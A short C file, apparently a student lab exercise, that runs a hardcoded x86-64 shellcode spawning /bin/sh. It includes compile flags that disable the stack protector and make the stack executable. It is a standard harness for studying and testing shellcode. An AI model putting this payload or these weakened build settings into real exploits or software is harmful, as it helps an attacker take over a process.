// Léon NEYHOUSSER Ing3 cs Groupe A
#include <stdio.h>
#include <string.h>
//pour compiler gcc wrapper.c -o wrapper -fno-stack-protector -z execstack

int main(int argc, char ** argv) {
    char opcode[] = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
    typedef int(*shellcode_t)();
    printf("Shellcode Length: %ld\n", strlen(opcode));
    shellcode_t ret = (shellcode_t)opcode;
    ret();
}